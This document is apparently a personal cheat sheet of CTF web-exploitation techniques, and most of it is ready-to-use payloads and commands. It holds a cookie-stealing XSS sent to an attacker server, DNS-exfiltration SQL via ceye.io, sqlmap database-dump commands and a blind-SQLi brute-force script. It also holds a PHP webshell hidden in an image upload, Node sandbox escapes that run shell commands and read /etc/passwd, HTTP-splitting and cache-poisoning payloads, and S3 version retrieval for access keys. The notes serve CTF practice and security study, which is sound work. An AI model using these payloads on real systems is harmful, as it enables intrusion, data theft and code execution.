```

- ~/code/snippets/ctf/web/redirect.svg
- https://lorexxar.cn/2015/11/19/xss-link/
- [CONFidence CTF 2019\-Web 50分析思考 &\#8211; 郁离歌丶的博客](http://yulige.top/?p=665)
    - [SVG XSS的一个黑魔法 · Tuuu Nya&\#39;s Blog](https://www.hackersb.cn/hacker/85.html)

- ~/code/snippets/ctf/web/xss_in_gif.js
- https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/web-Imgr.txt
    ```bash
    exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver?c='+document.cookie</script>" imagefinal.jpg
    ```

# SQL Injection (SQLI)

- https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
- ~/code/src/security/PayloadsAllTheThings/SQL Injection/Intruder

```bash
sqlmap -u "http://joking.bitsctf.bits-quark.org/index.php" --data="id=1&submit1=submit" -D hack -T Joker -C Flag --dump
sqlmap -u "http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/login.php" --csrf-token="user_token" --csrf-url="http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/" --data="username=a&password=a&Login=Login&user_token=" --dump
sqlmap -r seccon.txt  --ignore-401 --dbs --proxy=http://127.0.0.1:8080
sqlmap -r seccon.txt  --ignore-401 --hex --tables -D keiba --proxy=http://127.0.0.1:8080

# String delimiter sqli
sqlmap.py -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a" --cookie="PHPSESSID=my_sess_id" --prefix="9780060878849\'" --technique B --dbms=MySQL --risk=3 --string covers -D book_shop -T books -C book_serial --dump

# Boolean-based blind sqli
sqlmap.py -u http://ctf.sharif.edu:8082/login.php --method=POST --data="username=a&password=b" -p username --technique=B --string injection --dbms=MySQL --risk=3 -D irish_home -T users --dump --prefix="aa\""
# ||
~/share/ctf/2021/tamy/blind_sqli_bitmask.py

# Preprocessing (i.e. set dynamic content in request based on payload)
~/code/snippets/ctf/web/sqlmap_preprocess_wrap.py

# Tamper (i.e. encode payload)
~/code/snippets/ctf/web/sqlmap_tamper_wrap.py
~/share/opt/sqlmap/tamper/
```

- Error-based
    - ~/share/ctf/n1ctf2020/web-signin/
    - https://www.gem-love.com/ctf/2657.html#websignin
    - https://eine.tistory.com/entry/n1ctf-2020-web-signIn-write-up
    - https://github.com/Super-Guesser/ctf/tree/master/N1CTF%202020/web/signin
    ```
    ' or 1=1 UNION SELECT database(),1 #
    ' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = '' #

    User-Agent: ' or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(1) #
    User-Agent: ' or 1 group by concat_ws(0x3a,(select group_concat(table_name separator ',') from information_schema.tables where table_schema=database()),floor(rand(0)*2)) having min(1) #

    %" UNION SELECT "one", "two"; --%";
    %" AND username in (SELECT username FROM sqlite_master where username like "%") --

    -- Given 3 columns in table:
    telnet'	oorr	1=0	UNION	SELECT	*	FROM	(SELECT	1)	AS	a	JOIN	(SELECT	*	from	flag)	AS	b	JOIN	(SELECT	1)	AS	c;#

    -- Error-based query: Output contains string "n1ctf"
    -- WAF: preg_match("/get_lock|sleep|benchmark|count|when|case|rlike|count/i",$info)
    -- ExtractValue(xml_frag, xpath_expr)
    -- UpdateXML(xml_target, xpath_expr, new_xml)
    '&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=1 limit 1)))))&&'
    -- ||
    '&&(select extractvalue(rand(),0x3a6e31637466))&&'
    -- ERROR 1105 (HY000): XPATH syntax error: ':n1ctf'
    -- ||
    '||(select ip from n1ip where updatexml(1,concat('~',(select if(ascii(substring((select database()),1,1))=100,'n1ctf','r3kapig')),'~'),3))||'
    -- ERROR 1105 (HY000): XPATH syntax error: '~n1ctf~'
    ```
- WHERE alternative
    - https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/
    ```
    `?id=(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)))#`
    `?id=1&&mid(pass,1,1)=(0x61);%00`
    `?id=if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00`
    ```
- Replace spaces with comments
    - `1/*foo*/and`, `sel/*foo*/ect`
    - https://medium.com/@gregIT/ringzer0team-ctf-sqli-challenges-part-2-b816ef9424cc
- Replace spaces with parenthesis
    - `?id=(1)and(1)=(0)union(select(null),mid(group_concat(table_name),600,100),(null)from(information_schema.tables))#`
    - http://sla.ckers.org/forum/read.php?12,30425,page=10#msg-30696
    - https://www.40huo.cn/blog/0ctf-2017-writeup.html
    ```python
    import requests
    import string

    session = requests.session()
    url = "http://202.120.7.197/app.php"
    cookie = {"PHPSESSID": "ck8pgb52nkkb8sdg2c95ms7s16"}
    flag = ""

    for i in xrange(1, 50):
        for j in string.printable:
            if j == "%": continue
            param = {"action": "search", "keyword": "", "order": "if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{length},1)like({num}),price,name)".format(length=str(i), num=hex(ord(j)))}
            # print param
            res = session.get(url=url, params=param, cookies=cookie)
            content = res.text
            # print content
            if content.find("\"id\":\"5\"") > content.find("\"id\":\"2\""):
                print j
                flag += j
                print flag
                break
    ```
- `addslashes()`
    - missing quotes around parameter
        - => `sleep(30)`
    - conditional with subqueries, union
        - [\(The Unexpected SQL Injection\) Web Security Articles \- Web Application Security Consortium](http://www.webappsec.org/projects/articles/091007.shtml)
    - unicode smuggling, wide byte injection: escaped quote interpreted as unicode char in app, but as quote in db
        - => `bf 5c 27 == \xbf\\' == 뼧'`
        - http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string
        - http://www.comsecglobal.com/FrameWork/Upload/SQL_Smuggling.pdf
- `htmlspecialchars(evil, ENT_QUOTES)`
    - backslash escapes next quote
        - `mysql_query("select * from users where name='".htmlspecialchars($_GET[name],ENT_QUOTES)."' and id='".htmlspecialchars($_GET[id],ENT_QUOTES)."'");`
        - => `name=\&id=+or+sleep(30)/*`
- `mysqli::real_escape_string()`
    - does not escape backtick, `--`
    - https://sasdf.github.io/ctf/writeup/2019/google/web/glotto/
- DNS exfil
    - `select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));`
    - https://wiki.x10sec.org/web/sqli/

- Mitigation: prepared statements, whitelisting

# NoSQL Injection

- MongoDB
    - `columnFoo[$regex]=^.foo`
- [GitHub \- codingo/NoSQLMap: Automated NoSQL database enumeration and web application exploitation tool\.](https://github.com/codingo/NoSQLMap)
    - https://www.defcon.org/images/defcon-21/dc-21-presentations/Chow/DEFCON-21-Chow-Abusing-NoSQL-Databases.pdf
- https://nullsweep.com/nosql-injection-cheatsheet/

# Code Injection

- On: state persisted as objects (e.g. cookie)
    - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#dusty-notes
        - https://artsploit.blogspot.com/2016/08/pprce2.html
    ```
    j:[{"id":1,"body":__FILE__}]
    j:[{"id":1,"body":["foo'"]}]
    ```

# Deserialization

### java

- https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html
- https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-608664
- https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html
- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet

### php

- [GitHub \- ambionics/phpggc: PHPGGC is a library of PHP unserialize\(\) payloads along with a tool to generate them, from command line or programmatically\.](https://github.com/ambionics/phpggc/)
- https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/

# Path Traversal / Local File Inclusion (LFI)

- ~/code/guides/ctf/Web-CTF-Cheatsheet/README.md#LFI
- https://book.hacktricks.xyz/pentesting-web/file-inclusion
- via unrelated params
    - https://github.com/cygenta/CVE-2020-3452/blob/main/CVE-2020-3452.py

nginx:

- /etc/nginx/sites-enabled/default
    - https://github.com/Toboxos/ctf-writeups/blob/main/HackTheVote2020/Dotlocker1.md
    - https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/
    ```
    location ^~ /static => /static../foo
    ```

# File Upload

- nginx
    - missing strict check (e.g. `.php$`)
        ```
        location ~* .php { fastcgi_pass backend; # [...] }
        ```
- multipart request
    ```
    Content-Disposition: form-data; name="upfile"; filename="foo.php.png"
    Content-Type: image/gif

    GIF89a;<?system($_GET['cmd']);?>
    ```

- https://book.hacktricks.xyz/pentesting-web/file-upload
- https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

# Side Channels

- https://snyk.io/blog/node-js-timing-attack-ccc-ctf/

# jail, sandbox, waf, filter bypass

- detection, testing
    - https://regex101.com/
    - https://github.com/cujanovic/Open-Redirect-Payloads
    - https://nmap.org/nsedoc/scripts/http-waf-detect.html
    - https://github.com/EnableSecurity/wafw00f
    ```
    /?q='oorr''=''%23
    /?q='oorr/**/1=1/**/%23
    9495 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
    ```
- jsfuck
- https://mathiasbynens.be/notes/javascript-escapes
- `__defineGetter__`
    - https://hack.more.systems/writeup/2014/10/26/hacklu2014-objection/
    - [CTFtime\.org / TSG CTF 2020 / Beginner&\#39;s web](https://ctftime.org/task/12280)
- alternative for `()`
    - https://portswigger.net/research/javascript
    ```javascript
    alert`1337`in``.sub﻿in''instanceof""
    ```
- alternative for function call
    - https://www.sigflag.at/blog/2020/writeup-angstromctf2020-caasio/
        ```javascript
        (window?.a)``
        window.a?.()
        window["a"]()
        window["a"].apply(null, [1, 2, 3])
        // typeof o = "string"
        // o.constructor = String
        // String.constructor = Function
        (o=>o.constructor.constructor(
            o.constructor.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101))())(Math+1)
        ```
    - [CTFtime\.org / Hack\.lu CTF 2020 / BabyJS](https://ctftime.org/task/13520)
        ```
        > y
        'constructor'
        > y[y]
        [Function: String]
        > y[y][y]
        [Function: Function]
        > z
        'return e=>console.log(e)'
        > y[y][y](z)
        [Function: anonymous]
        > y[y][y](z)()
        [Function]
        > y[y][y](z)()('foo')
        foo
        undefined
        ```
- [CTFtime\.org / Harekaze CTF 2019 / /\(a\-z\(\)\.\)/ / Writeup](https://ctftime.org/writeup/15376)
    - [Harekaze 2019 writeups by terjanq \(https://twitter\.com/terjanq\) · GitHub](https://gist.github.com/terjanq/a571826c6bb08ae0dfa4ef57e03b5b72)
    ```javascript
    (typeof(x)).constructor((typeof(x)).big.name.length).concat(
    (typeof(x)).constructor((typeof(x)).big.name.length)) // "33"
    ```
- sandbox escape
    - if: all objects inside VM context
    - then:
        - https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed
        - throw and catch host exception
        ```javascript
        try {
            this.process.removeListener();
        }
        catch (host_exception) {
            console.log('host exception: ' + host_exception.toString());
            host_constructor = host_exception.constructor.constructor;
            host_process = host_constructor('return this')().process;
            child_process = host_process.mainModule.require("child_process");
            console.log(child_process.execSync("cat /etc/passwd").toString());
        }
        ```
    - else: use `this`
        - https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html
        ```javascript
        this.constructor.constructor('return this.process')().mainModule.require("child_process").execSync('cat * | grep CSR')
        ```
    - [Escaping nodejs vm · GitHub](https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af)
    - [CTFtime\.org / SECCON 2020 Online CTF / Capsule / Writeup](https://ctftime.org/writeup/24124)
        - [V8's inspector API](https://chromedevtools.github.io/devtools-protocol/) from [Node.js](https://nodejs.org/api/inspector.html)
            ```javascript
            global.flag = flag;
            const inspector = require('inspector');
            const session = new inspector.Session();
            session.connect();
            session.post('Runtime.evaluate', {expression: 'flag'}, (e, d) => {
              session.post('Runtime.getProperties', {objectId: d.result.objectId}, (e, d) => {
                console.log(d.privateProperties[0].value.value);
              });
            });
            ```
        - [Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
            ```javascript
            const fs = require('fs');
            // require() defined in node, but shadowed
            function require() {
              const fs = process.mainModule.require('fs');
              console.log(fs.readFileSync('flag.txt').toString());
            }
            ```
        - https://nodejs.org/api/v8.html#v8_v8_getheapsnapshot
            ```javascript
            const v8 = require('v8');
            const memory = v8.getHeapSnapshot().read();
            const index = memory.indexOf('SEC' + 'CON');
            const len = memory.slice(index).indexOf('}');
            const flagBuffer = memory.slice(index, index + len + 1);
            console.log(flagBuffer.toString());
            ```
- alternative for `child_process`
    - https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html
    - https://github.com/nodejs/node/blob/master/lib/internal/child_process.js
    ```javascript
    this.proc_wrap = this.constructor.constructor('return this.process.binding')();
    this.Process = this.proc_wrap('process_wrap').Process;
    this.process = new Process();
    this.env = this.constructor.constructor('return this.process.env')();
    this.mproc  = this.constructor.constructor('return this.process')();
    this.sot = this.constructor.constructor('return this.process.stdout')();
    this.sin = this.constructor.constructor('return this.process.stdin')();
    this.rc = process.spawn({file:'/home/guest/flag_reader',args:[],cwd:"/home/guest",windowsVerbatimArguments:false,detached:false,envPairs:this.env, stdio:[mproc.stdin, mproc.stdout, mproc.stderr]});
    ```
- Object.freeze() is shallow
    ```javascript
    Object.freeze(Math);
    (o=>o.trusted=1)(Math.__proto__)
    ```
- php, non alphanumeric
    - https://github.com/ExTi0p/ctf/tree/master/2020/FwordCTF_2020/Jailoo_Warmup
    - https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/
- Content-Type, multipart parsing
    - https://github.com/BlackFan/content-type-research
    - https://soroush.secproject.com/blog/2018/08/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour/
    - https://blog.doyensec.com/2020/08/20/playframework-csrf-bypass.html
    ```
    Content-Type: application/x-www-form-urlencoded;/json
    {"q":"' \u0075nion \u0073elect '1"}
    ```
- url encoding, unicode utf-8 translation levels
    - https://www.cgisecurity.com/lib/URLEmbeddedAttacks.html
    - given `\r\n` in url: http request splitting
        - https://github.com/p4-team/ctf/tree/master/2019-11-14-dragon-finals/cat_flag
        - ~/code/guides/ctf/p4-team-ctf/2019-11-14-dragon-finals/cat_flag/
        ```
        >>> a=sys.stdout.buffer.write(bytes(' '.join([bin(c)[2:].zfill(8) for c in b'\x0d\x0a']), 'latin-1'))
        00001101 00001010
        >>> a=sys.stdout.buffer.write(bytes(' '.join([bin(c)[2:].zfill(8) for c in b'\xe0\xb4\x8a']), 'latin-1'))
        11100000 10110100 10001010
        ```
- HTTP Path Normalization, IDNA
    - e.g.
        ```
        http://nginx：80/flag.php
        http://＠nginx/flag.php
        http://nginx／flag.php
        http://a:.@✊nginx:80.:/flag.php
        // ACE = http://a:.xn--@nginx:80-5s4f.:/flag.php
        /foo?ɋ=bar (%C9%8B)
        'ß'.toUpperCase() === 'SS'
        ```
    - [CTFtime\.org / BambooFox CTF 2021 / SSRFrog / Writeup](https://ctftime.org/writeup/25763)
        ```javascript
        function findVariants(targetChar) {
            let targetHost = 'fake' + targetChar + '.com';
            for (i = 32; i <= 65535; i++) {
                let candidateChar = String.fromCharCode(i);
                let input = 'http://fake' + candidateChar + '.com';
                try {
                    let url = new URL(input);
                    if (url.hostname === targetHost) {
                        console.log(targetChar, ':', i, candidateChar);
                    }
                }
                catch(e) {
                }
            }
        }
        ```
- Back slashes interpreted as forward slashes
    - https://samcurry.net/abusing-http-path-normalization-and-cache-poisoning-to-steal-rocket-league-accounts/
    ```
    Location: https:\\foo.com/bar
    ```
- DNS Rebinding
    - [CTFtime\.org / SECCON 2019 Online CTF / Option\-Cmd\-U](https://ctftime.org/task/9540)
    ```
    GET /?url=http://ocu.chal.seccon.jp:10000/flag.php
    ---
    localhost.my_server A   (vulnerable_ip)
    localhost.my_server A   (my_server_ip)
    ---
    GET /?url=http://localhost.my_server/flag.php
    ```
- DNS tunnel
    - https://github.com/iagox86/dnscat2
- HTTP splitting
    ```
    language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
    ```
- cache poisoning
    - https://owasp.org/www-community/attacks/Cache_Poisoning
        ```
        language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
        ```
    - https://youst.in/posts/cache-poisoning-at-scale/
        - url fragment ignored when generating cache key
            ```
            /#/../?r=javascript:alert(1)
            ```
        - `x-http-method-override: HEAD` returning an empty response body
        - `x-forwarded-scheme: http` triggering redirect loop
        - `GET /foo.js` + `x-forwarded-host: foo` leading to stored xss
        - `GET /foo?size=32x32&siz%65=0` where cache key uses first parameter but backend uses second parameter
        - [headers\.txt · GitHub](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)
    - https://www.saddns.net/
- TOCTOU on custom header validation happening before connection header is processed: set custom header key as connection header value, which is removed by proxy
    - https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
- https://haboob.sa/ctf/nullcon-2019/babyJs.html
    - [Breakout in v3\.6\.9 · Issue \#186 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/186)
    - [Escaping the vm sandbox · Issue \#32 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/32)
- redirect given appended string
    - `foo.com?var=`
    - `foo.com\r\nFoo-Header:`
- URL path truncation - use `/..` padding
    - `python -c 'print("http://foo?page=a/../admin.html"+"/."*2027)'`
    - http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20path%20truncation.html
- Payload parsing truncation - use newline padding
    - [How to bypass the Cloudflare WAF using a padding technique \- Swascan](https://www.swascan.com/cloudflare/)
    - https://support.cloudflare.com/hc/en-us/articles/200172016-Understanding-the-Cloudflare-Web-Application-Firewall-WAF-
        > The Cloudflare WAF parses JSON responses to identify vulnerabilities targeted at APIs. The WAF limits JSON payload parsing to 128 KB
- JavaScript treats the U+2028 Line Separator character as a line terminator which results in a newline
    - https://edoverflow.com/2022/bypassing-razers-dom-based-xss-filter/
    - https://github.com/v8/v8/blob/78bc785227e95efe05f045756463696e06095506/src/parsing/scanner.cc#L208-L217
    - https://tc39.es/ecma262/#sec-line-terminators
    ```
    javascript://deals.razerzone.com/%E2%80%A8alert(document.domain)
    ```

```javascript
// == "Hello World!"
/Hello W/.source+/ordl!/.source

// == alert('1337')
// https://twitter.com/garethheyes/status/1493987593511387137
'1337'.split(window,window[Symbol['split']]=alert)
'1337'.replace(window,window[Symbol['replace']]=alert)
```

```bash
# Enumerate blocked chars
# Alternative: Burp Intruder
for n in {32..127}; do
    c=$(awk '{ printf("%c", $0); }' <<< $n)
    echo "$c"
    curl 'http://foo/' --data-raw 'cmd='"$c"'&submit=' | grep -E '(< HTTP)|error|success'
done 2>/dev/null | vim -
```

### case studies

- [ModSecurity: Documentation](https://modsecurity.org/documentation.html)

# JSON Web Tokens

- [JSON Web Tokens \- jwt\.io](https://jwt.io/)
- [GitHub \- ticarpi/jwt\_tool: A toolkit for testing, tweaking and cracking JSON Web Tokens](https://github.com/ticarpi/jwt_tool)
- [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
    - modify signature verification function: `"alg": "none"`
    - if a server is expecting a token signed with RSA, but actually receives a token signed with HMAC, it will think the public key is actually an HMAC secret key: `forgedToken = sign(tokenPayload, 'HS256', serverRSAPublicKey)`

# wasm

- https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/
- https://klatz.co/ctf-blog/boilerctf-alien-tech

# aws

- https://0day.work/balccon2k20-ctf-let-me-see-and-dawsonite-writeups/
    ```bash
    # take aws domain name
    dig foo
    # take version id header
    curl -v 'http://foo.s3-website-us-east-1.amazonaws.com/bar'
    # take version id
    curl -v 'https://foo.s3.amazonaws.com/?versions&prefix=bar'
    # take access keys
    curl -v 'https://foo.s3.amazonaws.com/bar?versionId=zcoAvy97sFgFdR08.kypq1KyLj9iZuAD'
    aws s3api get-object --bucket foo --key bar bar
    ```
